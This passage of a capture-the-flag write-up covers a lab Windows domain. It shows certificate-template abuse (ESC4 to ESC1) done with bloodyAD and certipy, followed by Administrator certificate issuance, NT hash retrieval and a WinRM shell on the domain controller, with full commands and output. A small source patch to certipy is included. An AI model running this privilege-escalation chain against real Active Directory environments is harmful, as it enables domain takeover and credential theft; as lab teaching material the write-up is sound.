![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

Client Authentication is already set. I’ll use `bloodyAD` to enable Enrollee Supplies Subject. Setting `msPKI-Certificate-Name-Flag` to 1 (`ENROLLEE_SUPPLIES_SUBJECT`) replaces the existing flags, including the requirement to build the subject from AD:

```
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q bloodyAD --host DC1.ping.htb -d ping.htb -k set object 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' msPKI-Certificate-Name-Flag -v 1
[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's msPKI-Certificate-Name-Flag has been updated
```

Now it’s vulnerable to ESC1, but I don’t have access to a user that can enroll (it shows only admins in the output above). `GenericAll` on a template includes the Enroll extended right, so I’ll grant that to c.roberts (grabbing their SID from BloodHound):

```
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q bloodyAD --host DC1.ping.htb -d ping.htb -k add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
```

Now I request a certificate as c.roberts for Administrator:

```kotlin
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q certipy req -k -no-pass -target dc1.ping.htb -dc-host dc1.ping.htb -ca ping-DC1-CA -template SmartcardAuthentication -upn administrator@ping.htb -sid 'S-1-5-21-750635624-2058721901-1932338391-500'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

I can use `certipy` here because there’s no cross-domain auth. c.roberts is a user on `ping.htb` and can enroll in this template (now that I’ve modified it).

Now I auth with that certificate:

```css
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.128.220
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```

And use that TGT to get a shell:

```rust
oxdf@hacky$ KRB5CCNAME=administrator.ccache evil-winrm-py -i dc1.ping.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc1.ping.htb:5985' as 'administrator@PING.HTB'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

And get `root.txt`:

```
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
8beb8eb0************************
```

#### Abuse with certipy Fix

There’s an [issue on certipy GitHub](https://github.com/ly4k/Certipy/issues/328) and an open (unmerged) [PR with a fix](https://github.com/ly4k/Certipy/pull/337). I couldn’t get this to work as written. In `certipy/lib/target.py`, the `from_options` function has two branches that handle `-dc-host` not being set. The PR changes the `else` branch to leave `dc_host` as `None`, but `find` and `template` go through the `if dc_as_target:` branch, which still sets `dc_host` to the `remote_name` (`dc1.ping.htb`). Certipy resolves that to an IP and uses it as the KDC, so my `PONG.HTB` TGT gets sent straight to DC1, which rejects it with `KDC_ERR_WRONG_REALM`. I’ll change that line in the `dc_as_target` branch in `target.py` to `None` as well, which lets Impacket ask `PONG.HTB` first and follow the referral to `PING.HTB` (hat tip to Claude for the troubleshooting):

```
        if dc_as_target:
            ...
            if not dc_host:
                dc_host = None  # was: dc_host = remote_name
```

Now I can run `certipy` (the patched version reports as v5.0.4):

```yaml
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q certipy find -vulnerable -stdout -k -no-pass -target dc1.ping.htb -ns 10.129.128.220
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[-] Could not find user 'R.MARTINELLI'
[!] User SID can't be retrieved. For more accurate results, add it manually with -sid
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

Interestingly, it doesn’t show ESC4. That’s due to this line:

```
[-] Could not find user 'R.MARTINELLI'
[!] User SID can't be retrieved. For more accurate results, add it manually with -sid
```

It’s still failing to grab information about the user I’m running as. I’ll get r.martinelli’s SID from BloodHound and run again:

```yaml
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q certipy find -vulnerable -stdout -k -no-pass -target dc1.ping.htb -ns 10.129.128.220 -sid S-1-5-21-2410575906-3092493790-2123333151-1124
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[-] Could not find user 'R.MARTINELLI'
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : SmartcardAuthentication
    Display Name                        : Smartcard Authentication
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-01-17T15:39:18+00:00
    Template Last Modified              : 2026-01-17T15:39:37+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
    [+] User ACL Principals             : PING.HTB\CA Managers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
  1
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

This time it finds it. Now I can use `certipy template` to make this template vulnerable to ESC1:

```css
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q certipy template -k -no-pass -target dc1.ping.htb -template "SmartcardAuthentication" -write-default-configuration
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Saving current configuration to 'SmartcardAuthentication.json'
[*] Wrote current configuration for 'SmartcardAuthentication' to 'SmartcardAuthentication.json'
[*] Updating certificate template 'SmartcardAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SmartcardAuthentication'? (y/N): y
[*] Successfully updated 'SmartcardAuthentication'
```

The default configuration also replaces the template’s security descriptor. The `nTSecurityDescriptor` it writes grants Authenticated Users (`S-1-5-11`) full control. So unlike the manual path, I don’t need to grant enrollment rights to anyone, and r.martinelli can request the certificate directly.

Now I request a certificate as Administrator on `ping.htb`:

```kotlin
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q certipy req -k -no-pass -target dc1.ping.htb -template "SmartcardAuthentication" -ca ping-dc1-ca -upn Administrator@ping.htb -sid S-1-5-21-750635624-2058721901-1932338391-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now I can auth with the certificate:

```css
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.129.128.220
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```

And get a shell using the TGT:

```rust
oxdf@hacky$ KRB5CCNAME=administrator.ccache evil-winrm-py -i dc1.ping.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc1.ping.htb:5985' as 'administrator@PING.HTB'
evil-winrm-py PS C:\Users\Administrator\Documents>
```
